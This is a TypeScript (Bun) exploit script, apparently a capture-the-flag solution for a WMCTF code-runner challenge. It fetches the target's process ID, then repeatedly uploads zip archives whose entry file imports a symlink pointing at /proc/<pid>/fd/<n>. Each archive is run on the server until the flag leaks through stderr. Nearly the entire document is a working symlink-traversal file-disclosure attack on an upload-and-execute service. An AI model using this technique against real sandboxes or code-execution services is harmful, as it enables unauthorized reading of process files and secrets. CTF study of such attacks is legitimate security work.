#!/usr/bin/env -S bun run
import JSZip from 'jszip';

// The target URL of the problem, without trailing slash
const TARGET_URI = "http://test.vnteam.cn:51331"
// The regex to match the flag
const FLAG_REGEX = /WMCTF{[^}]+}/

function createSymlinkZip(pid, fd) {
    const zip = new JSZip();
    zip.file('symlink.ts', `/proc/${pid}/fd/${fd}`, {
        unixPermissions: 0o755 | 0o120000, // symlink
    })
    zip.file('vuln.ts', "import './symlink.ts';\n")
    return zip;
}

let resp, json

const exit = (code) => process.exit(code)
const mark_prev_green = (prev = 1) => console.info('\x1b[1A'.repeat(prev) + '\x1b[0G\x1b[32m[+]\x1b[0m' + '\n'.repeat(prev - 1 > 0 ? prev - 1 : 0));
const print_blue = (msg) => console.info('\x1b[34m[ ]\x1b[0m ' + msg);
const print_sub_gray = (msg, prev = 0) => console.info('\x1b[1A'.repeat(prev) + '\x1b[2K\x1b[5G\x1b[90m[ ] ' + msg + '\x1b[0m');
const print_sub_blue = (msg, prev = 0) => console.info('\x1b[1A'.repeat(prev) + '\x1b[2K\x1b[5G\x1b[34m[ ]\x1b[0m ' + msg);
const print_sub_green = (msg, prev = 0) => console.info('\x1b[1A'.repeat(prev) + '\x1b[2K\x1b[5G\x1b[32m[+]\x1b[0m ' + msg);
const print_prev_green = (msg) => console.info('\x1b[1A\x1b[0G\x1b[2K\x1b[32m[+]\x1b[0m ' + msg);
const print_value = (title, value) => console.info(`\x1b[35m[+] ${title}:\x1b[0m \x1b[36m${value}\x1b[0m`);

// Collect information
print_blue('Fetching status')
resp = await fetch(`${TARGET_URI}/status`)
json = await resp.json()
print_prev_green('Fetched status')
const pid = json.pid
print_value('PID', pid)

// Leak
let _uuid = '', success = false
for (let fd = 6; fd <= 20; ++fd) try {
    _uuid = ''
    print_blue(`Trying \x1b[35mfd=\x1b[36m${fd} \x1b[25G\x1b[90m /proc/${pid}/fd/${fd}\x1b[0m`)
    print_sub_gray('Create zip',)
    print_sub_gray('Upload',)
    print_sub_gray('Run code',)

    // Create zip
    print_sub_blue('Creating zip\n\n', 3)
    const formdata = new FormData()
    const zip = createSymlinkZip(pid, fd)
    const zipBlob = new Blob([await zip.generateAsync({ type: 'blob', platform: 'UNIX' })])
    formdata.append('file', zipBlob, 'vuln.zip')
    formdata.append('entry', 'vuln.ts');
    print_sub_green('Zip file created\n\n', 3)

    print_sub_blue('Uploading\n', 2)
    resp = await fetch(`${TARGET_URI}/api/upload`, {
        method: 'POST',
        body: formdata
    })
    json = await resp.json()
    const uuid = json.data.id
    _uuid = uuid
    print_sub_green(`Uploaded (\x1b[35mUUID: \x1b[36m${uuid}\x1b[0m)\n`, 2)

    // Run Code
    print_sub_blue('Running code', 1)
    resp = await fetch(`${TARGET_URI}/api/run/${uuid}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    })
    print_sub_green('Run code', 1)
    mark_prev_green(4)
    json = await resp.json()
    // Test if flag is leaked
    if (FLAG_REGEX.test(json.result.stderr)) {
        const flag = json.result.stderr.match(FLAG_REGEX)[0]
        success = true
        print_value('Flag', flag)
        break
        // exit(0)
    }
} catch (e) { } finally {
        success || console.info('\x1b[1A'.repeat(4) + "\x1b[0G\x1b[1A")
        _uuid && fetch(`${TARGET_URI}/api/cancel/${_uuid}`, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' } })
    }
